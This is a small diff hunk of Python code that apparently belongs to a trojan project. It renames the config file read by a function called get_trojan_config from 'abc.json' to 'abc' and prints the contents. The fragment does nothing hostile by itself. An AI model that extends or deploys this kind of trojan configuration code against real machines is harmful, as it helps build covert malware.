@@ -58,7 +58,7 @@ def get_file_contents(filepath):
 def get_trojan_config():
     global configured;
     
-    config_json = get_file_contents("abc.json");
+    config_json = get_file_contents("abc");
     
     print(config_json);
 
